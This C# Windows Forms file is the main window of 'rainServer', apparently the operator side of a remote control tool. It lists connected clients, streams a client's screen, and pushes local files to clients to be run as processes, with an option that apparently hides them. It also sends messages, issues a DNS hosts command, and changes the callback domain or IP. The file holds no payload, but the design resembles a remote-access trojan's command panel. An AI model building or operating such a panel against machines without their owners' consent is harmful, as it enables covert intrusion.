using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

using System.IO;
using networkWork.view;
using System.Net.Sockets;

namespace rainServer
{
    public partial class Form1 : Form, mainWindow
    {
        public Form1()
        {    
            InitializeComponent();          
        }

        public event Action<Socket, streamWindow> streamStart;
        public event Action<int, string, string, string> sendInfo;
        public event Action<ipMode, string> ipEvent;

        private void dataGridView1_CellDoubleClick(object sender, DataGridViewCellEventArgs e)
        {            
            Form2 f2 = new Form2();
            streamStart((Socket)dataGridView1.CurrentRow.Cells[2].Value, f2);
            f2.Show();            
        }

        public void connectionClient(Socket newClient, string ip, DateTime connectedTime)
        {
            string Time = $"time - {connectedTime.Hour}:{connectedTime.Minute}, data - {connectedTime.Day}.{connectedTime.Month}.{connectedTime.Year}";
            Invoke(new Action(() => dataGridView1.Rows.Add(ip, Time, newClient)));
            Invoke(new Action(() => textBox1.Text += $"+Connected {ip} = {Time}" + Environment.NewLine));
        }

        public void shutdownClient(Socket Client, string ip, DateTime disconnectedTime)
        {
            string Time = $"time - {disconnectedTime.Hour}:{disconnectedTime.Minute}, data - {disconnectedTime.Day}.{disconnectedTime.Month}.{disconnectedTime.Year}";
            foreach (DataGridViewRow row in dataGridView1.Rows)
            {
                if (row.Cells["IP"].Value.Equals(ip))
                {
                    Invoke(new Action(() => dataGridView1.Rows.RemoveAt(row.Index)));
                    break;
                }
            }
            Invoke(new Action(() => textBox1.Text += $"-Disconnected {ip} = {Time}" + Environment.NewLine));
        }

        private void saveLogToolStripMenuItem_Click(object sender, EventArgs e)
        {
            DateTime date = DateTime.Now;
            string fileName = $"D{date.Day}M{date.Month}Y{date.Year}H{date.Hour}M{date.Minute}.txt";
            saveFileDialog1.FileName = fileName;
            if (saveFileDialog1.ShowDialog() == DialogResult.OK)                            
                File.WriteAllText(saveFileDialog1.FileName, textBox1.Text);
            MessageBox.Show($"Файл {fileName} сохранён", "Message");         
        }

        private void sendInfoToClient(string mode, string value)
        {
            if (dataGridView1.Rows.Count > 0)
            {
                Socket client = (Socket)dataGridView1.CurrentRow.Cells[2].Value;
                sendInfo?.Invoke(dataGridView1.Rows.Count, ((System.Net.IPEndPoint)client.RemoteEndPoint).Address.ToString(), mode, value);
            }
            else
                MessageBox.Show("There are no active connections :(", "Error!");
        }

        private void button2_Click(object sender, EventArgs e)
        {
            if (textBox3.Text != "")
            {
                string[] str = textBox2.Text.Split('\\');
                byte[] atribute = File.ReadAllBytes(textBox2.Text);
                StringBuilder sB = new StringBuilder();
                for (int i = 0; i < atribute.Length; i++)
                    sB.Append(atribute[i] + "|");

                sendInfoToClient($"{taskMode.startProcess} {str[str.Length - 1]} {!checkBox2.Checked} {checkBox1.Checked}", sB.ToString());
            }
            else
                MessageBox.Show("No file chosen :(", "Error!");
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (openFileDialog1.ShowDialog() == DialogResult.OK)            
                textBox2.Text = openFileDialog1.FileName;                       
        }

        private void textBox2_TextChanged(object sender, EventArgs e)
        {
            textBox3.Text = "";
            if (File.Exists(textBox2.Text))
                textBox3.Text = File.ReadAllBytes(textBox2.Text).Length.ToString() + " byte";
        }

        private void button3_Click(object sender, EventArgs e)
        {
            sendInfoToClient($"{taskMode.sendMessage} {textBox4.Text}", textBox5.Text);
        }


        private void button5_Click(object sender, EventArgs e)
        {
            sendInfoToClient($"{taskMode.removeHostDNS}", textBox6.Text);
        }

        public void message(string mes, string header)
        {
            MessageBox.Show(mes, header);
        }

        private void button4_Click(object sender, EventArgs e)
        {
            ipEvent?.Invoke(ipMode.checkIp, textBox6.Text);
        }

        private void getCurentIPToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ipEvent?.Invoke(ipMode.getCurentIp, null);
        }

        private void getDomainToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ipEvent?.Invoke(ipMode.getDomain, null);
        }

        private void setNewDomainToolStripMenuItem_Click(object sender, EventArgs e)
        {
            inputForm iF = new inputForm();
            iF.ShowDialog();
            if (iF.morfoze)
                ipEvent?.Invoke(ipMode.setNewDomein, iF.getDomain);            
        }

        private void getIPToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ipEvent?.Invoke(ipMode.getDomainIp, null);
        }

        private void setNewIPToolStripMenuItem_Click(object sender, EventArgs e)
        {
            paswdInput pI = new paswdInput();
            pI.ShowDialog();
            if (pI.morfoze)
                ipEvent?.Invoke(ipMode.setNewIp, pI.getPasswd);
        }
    }
}
